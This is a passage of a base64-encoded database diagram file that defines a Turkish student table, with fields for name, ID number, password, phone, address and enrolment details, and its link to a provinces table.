JCQk8XmNoZWNrcyB2YWx1ZT0iMCIvPgoJCQkJPF5ncm91cCB2YWx1ZT0iLTEiLz4KCQkJCTxeaGVpZ2h0IHZhbHVlPSItMSIvPgoJCQkJPF5pbmRleGVzIHZhbHVlPSIwIi8+CgkJCQk8XmxldmVsIHZhbHVlPSIxIi8+CgkJCQk8XmxpbmtzIHZhbHVlPSIwIi8+CgkJCQk8XmxvY2sgdmFsdWU9IjAiLz4KCQkJCTxebWV0aG9kcyB2YWx1ZT0iMCIvPgoJCQkJPF5taW5pbWl6ZWQgdmFsdWU9IjAiLz4KCQkJCTxecHJvcGVydGllcyB2YWx1ZT0iMCIvPgoJCQkJPF50cmlnZ2VycyB2YWx1ZT0iMCIvPgoJCQkJPF51bmlxdWVzIHZhbHVlPSIwIi8+CgkJCQk8YmFja19jb2xvciB2YWx1ZT0iQjRENjQ3MDAiLz4KCQkJCTxuYW1lIHZhbHVlPSJUYWJsZTEiLz4KCQkJCTxwb3NpdGlvbiB2YWx1ZT0iMjE5OzM1MSIvPgoJCQkJPHNpemUgdmFsdWU9IjE0MDsxMDQiLz4KCQkJPC9Qcm9wZXJ0aWVzPgoJCQk8VHlwZSB2YWx1ZT0iVGFibGUiLz4KCQk8L1RhYmxlMT4KCQk8b2JEaWFncmFtPgoJCQk8UHJvcGVydGllcz4KCQkJCTxebG9jayB2YWx1ZT0iMCIvPgoJCQkJPGJhY2tfY29sb3IgdmFsdWU9IkZGRkZGRiIvPgoJCQkJPGdhbW1hIHZhbHVlPSIwIi8+CgkJCQk8bmFtZSB2YWx1ZT0ib2JEaWFncmFtIi8+CgkJCQk8c2l6ZSB2YWx1ZT0iMjA0ODsyMDQ4Ii8+CgkJCQk8c3R5bGUgdmFsdWU9IjQiLz4KCQkJCTxzdHlsZV9saW5rcyB2YWx1ZT0iMCIvPgoJCQkJPHVuaXRzIHZhbHVlPSI1Ii8+CgkJCTwvUHJvcGVydGllcz4KCQkJPFR5cGUgdmFsdWU9IkRpYWdyYW0iLz4KCQk8L29iRGlhZ3JhbT4KCTwvQ29udHJvbHM+Cgk8R1VJPgoJCTxGdWxsVG9vbGJhckxlZnQgdmFsdWU9IjEiLz4KCQk8RnVsbFRvb2xiYXJSaWdodCB2YWx1ZT0iMSIvPgoJCTxQYWdlRWRpdG9yIHZhbHVlPSItMSIvPgoJCTxQYWdlRWRpdG9ySCB2YWx1ZT0iMCIvPgoJCTxQYWdlVG9vbGJhckxlZnQgdmFsdWU9IjAiLz4KCQk8UGFnZVRvb2xiYXJSQiB2YWx1ZT0iMCIvPgoJCTxQYWdlVG9vbGJhclJpZ2h0IHZhbHVlPSIwIi8+CgkJPFBhbmVDbGlwYm9hcmQgdmFsdWU9IjAiLz4KCQk8UGFuZUxheW91dCB2YWx1ZT0iMCIvPgoJCTxQYW5lVmlldyB2YWx1ZT0iMCIvPgoJCTxTY3JvbGxYIHZhbHVlPSIwIi8+CgkJPFNjcm9sbFkgdmFsdWU9IjAiLz4KCQk8U2VsZWN0aW9uIHZhbHVlPSJiMkpFYVdGbmNtRnQiLz4KCQk8U2hvd0FsbCB2YWx1ZT0iMSIvPgoJCTxTaG93Q2hhbmdlcyB2YWx1ZT0iMSIvPgoJCTxTaG93R0wgdmFsdWU9IjEiLz4KCQk8U2hvd0dyaWQgdmFsdWU9IjEiLz4KCQk8VXNlR3JpZCB2YWx1ZT0iMCIvPgoJPC9HVUk+Cgk8TW9kZWw+CgkJPG9iPgoJCQk8bGluaz4KCQkJCTxvMD4KCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCTxDYXJkaW5hbGl0eSB2YWx1ZT0iT05FIHRvIE1BTlkiLz4KCQkJCQkJPENoaWxkX1RhYmxlIHZhbHVlPSJvZ3JlbmNpbGVyIi8+CgkJCQkJCTxGb3JlaWduX0tleSB2YWx1ZT0iYVd3PSIvPgoJCQkJCQk8TmFtZSB2YWx1ZT0iaWwiLz4KCQkJCQkJPE9uX0RlbGV0ZSB2YWx1ZT0iUmVzdHJpY3QiLz4KCQkJCQkJPE9uX1VwZGF0ZSB2YWx1ZT0iUmVzdHJpY3QiLz4KCQkJCQkJPFBhcmVudF9UYWJsZSB2YWx1ZT0iaWxsZXIiLz4KCQkJCQkJPFByaW1hcnlfS2V5IHZhbHVlPSJhV3hMYjJSMSIvPgoJCQkJCTwvUHJvcGVydGllcz4KCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCTxuYW1lIHZhbHVlPSJpbCIvPgoJCQkJPC9vMD4KCQkJPC9saW5rPgoJCQk8dGFibGU+CgkJCQk8bzA+CgkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQk8QXZlcmFnZV9Sb3dfU2l6ZSB2YWx1ZT0iNjU1Ii8+CgkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCTxDb2xsYXRpb24gdmFsdWU9InV0ZjhfdHVya2lzaF9jaSIvPgoJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCTxDcmVhdGVfVGltZSB2YWx1ZT0iMjAxNS0wMi0xNiAxNTo1NTo1NiIvPgoJCQkJCQk8RW5naW5lIHZhbHVlPSJJbm5vREIiLz4KCQkJCQkJPEZpZWxkX0NvdW50IHZhbHVlPSIxNyIvPgoJCQkJCQk8SW5kZXhfQ291bnQgdmFsdWU9IjgiLz4KCQkJCQkJPExpbmtfQ291bnQgdmFsdWU9IjUiLz4KCQkJCQkJPE5hbWUgdmFsdWU9Im9ncmVuY2lsZXIiLz4KCQkJCQkJPFByaW1hcnlfS2V5IHZhbHVlPSJiMmR5Wlc1amFVNXYiLz4KCQkJCQkJPFJlY29yZF9Db3VudCB2YWx1ZT0iMjUiLz4KCQkJCQkJPFNpemUgdmFsdWU9IjEyOC4wMCBLYiIvPgoJCQkJCQk8VHJpZ2dlcl9Db3VudCB2YWx1ZT0iMCIvPgoJCQkJCQk8VW5pcXVlX0NvdW50IHZhbHVlPSIxIi8+CgkJCQkJCTxVcGRhdGVfVGltZSB2YWx1ZT0iIi8+CgkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCTxjb250cm9sIHZhbHVlPSJUYWJsZSIvPgoJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQk8ZmllbGQ+CgkJCQkJCTxvMD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IllvayIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iMTQiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjIwMCIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJhY2lrbGFtYSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlZhckNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iYWNpa2xhbWEiLz4KCQkJCQkJPC9vMD4KCQkJCQkJPG8xPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9InV0ZjhfdHVya2lzaF9jaSIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSIyIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSI0MCIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJhZGkiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJWYXJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImFkaSIvPgoJCQkJCQk8L28xPgoJCQkJCQk8bzEwPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjEyIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSItMSIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJrYXlpdFRhcmloaSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkRhdGUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ia2F5aXRUYXJpaGkiLz4KCQkJCQkJPC9vMTA+CgkJCQkJCTxvMTE+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IlRDIEtpbWxpayBObyIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjEiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjExIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9Im9ncmVuY2lObyIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIxIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ib2dyZW5jaU5vIi8+CgkJCQkJCTwvbzExPgoJCQkJCQk8bzEyPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjEzIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSI0Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9Im9ncmVuaW1EdXJ1bXUiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMyIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJUaW55SW50Ii8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9Im9ncmVuaW1EdXJ1bXUiLz4KCQkJCQkJPC9vMTI+CgkJCQkJCTxvMTM+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9Im1kNSBmb3JtYXTEsW5kYSBzYWtsYW7EsXlvci4uLiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjQiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjMyIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9InNpZnJlIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQ2hhciIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJzaWZyZSIvPgoJCQkJCQk8L28xMz4KCQkJCQkJPG8xND4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iMyIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iNDAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ic295YWRpIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iVmFyQ2hhciIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJzb3lhZGkiLz4KCQkJCQkJPC9vMTQ+CgkJCQkJCTxvMTU+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjUiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjEwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9InRlbGVmb25ObyIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0idGVsZWZvbk5vIi8+CgkJCQkJCTwvbzE1PgoJCQkJCQk8bzE2PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSIxNiIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iNCIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJ6YW1hbkRpbGltaSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIzIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlRpbnlJbnQiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iemFtYW5EaWxpbWkiLz4KCQkJCQkJPC9vMTY+CgkJCQkJCTxvMj4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IkdpcmlsbWVtacWfIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSI4Ii8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIxMDAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iYWRyZXMiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJWYXJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImFkcmVzIi8+CgkJCQkJCTwvbzI+CgkJCQkJCTxvMz4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjE3Ii8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIxIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImFrdGlmIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIxIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQ2hhciIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJha3RpZiIvPgoJCQkJCQk8L28zPgoJCQkJCQk8bzQ+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSJHaXJpbG1lbWnFnyIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iNyIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iNDAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iYmFiYUFkaSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlZhckNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iYmFiYUFkaSIvPgoJCQkJCQk8L280PgoJCQkJCQk8bzU+CgkJ